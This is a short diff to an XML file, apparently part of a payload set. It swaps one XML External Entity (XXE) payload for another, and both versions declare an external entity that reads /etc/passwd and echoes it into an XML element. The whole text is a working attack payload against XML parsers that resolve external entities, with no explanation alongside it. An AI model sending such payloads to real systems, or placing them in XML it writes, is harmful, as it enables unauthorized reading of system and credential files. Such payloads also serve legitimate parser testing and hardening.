@@ -1,6 +1,5 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
-<userInfo>
- <firstName>John</firstName>
- <lastName>&ent;</lastName>
-</userInfo>
+<?xml version="1.0"?>
+<!DOCTYPE XXE [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<pwn>&xxe;</pwn>
